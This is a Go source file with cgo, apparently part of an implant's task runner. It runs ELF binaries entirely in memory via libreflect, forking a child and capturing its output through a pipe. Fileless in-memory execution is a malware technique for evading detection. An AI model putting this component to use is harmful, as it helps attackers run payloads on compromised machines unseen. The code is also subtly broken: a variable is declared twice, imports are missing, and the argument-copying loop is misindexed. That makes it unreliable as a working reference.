//go:build cgo && linux

package taskrunner

/*
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>

extern void reflect_execv(const unsigned char *elf, char **argv);
extern void reflect_execve(const unsigned char *elf, char **argv, char **env);
extern void GoCallback(char *line, size_t len);

static inline int call_reflect_exec(unsigned char *data, char **argv) {
	int pid;
	int pipefd[2];
	if (pipe(pipefd) != 0) {
		return 0;
	}

	if ((pid = fork()) == 0)
    {
        close(pipefd[0]);    // close reading end in the child

        dup2(pipefd[1], 1);  // send stdout to the pipe
        dup2(pipefd[1], 2);  // send stderr to the pipe

        close(pipefd[1]);    // this descriptor is no longer needed

        reflect_execv(data, argv);
    }
    else
    {
        // parent

        char *line = NULL;
        close(pipefd[1]);  // close the write end of the pipe in the parent

		waitpid(pid, NULL, 0);

        FILE *stream = fdopen(pipefd[0], "r");
        size_t read_len = 0;
        while (getline(&line, &read_len, stream) != -1) {
			GoCallback(line, read_len);
        }
    }
	return pid;
}
*/

import "C"

type cgoOutput struct {
	Out *bytes.Buffer
	sync.Mutex
}

var outbuff cgoOutput

// ExecuteInMemory - Runs an ELF binary in memory using CGO and libreflect
// Returns a string containing the merged stdout + stderrr,
// the PID of the forked process, and any error that might have occured.
func ExecuteInMemory(data []byte, args []string) (string, int, error) {
	argv := make([]*C.char, len(args)+1)
	for i, a := range args[1:] {
		argv[i] = C.CString(a)
	}
	argv[len(args)] = nil
	defer func() {
		for _, arg := range argv {
			C.free(unsafe.Pointer(arg))
		}
	}()
	var output string
	outbuff.Lock()
	pid, err := C.call_reflect_exec((*C.uchar)(&data[0]), &argv[0])
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("Error during execution: %s\n", err)
		//{{end}}
		return "", 0, err
	}

	output := outbuff.Out.String()
	outbuff.Out.Reset()
	outbuff.Unlock()
	return output, int(pid), nil
}

// GoCallback - Callback function for C code to write to outbuff
// This callback in itself is not goroutine safe, so any caller
// must acquire the lock on outbuff before calling this function.
//
//export GoCallback
func GoCallback(line *C.char, len C.size_t) {
	outbuff.Out.WriteString(C.GoString(line))
}

func init() {
	outbuff.Out = &bytes.Buffer{}
}
